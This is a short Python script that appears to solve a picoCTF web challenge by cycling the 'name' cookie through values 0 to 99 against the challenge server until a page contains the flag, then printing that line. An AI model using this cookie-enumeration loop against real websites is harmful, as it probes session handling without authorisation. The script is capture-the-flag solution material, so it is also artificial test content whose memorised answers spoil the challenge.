url='http://mercury.picoctf.net:29649'
import requests
cookies = {}
i=0
import time
while True and i<100:
    cookies['name']=str(i)
    i+=1
    page = requests.get(url,cookies=cookies)
    if 'picoCTF' in page.text:
        break
    time.sleep(1)
    

for i in page.text.split('\n'):
    if 'picoCTF' in i:
        print(i)
        break
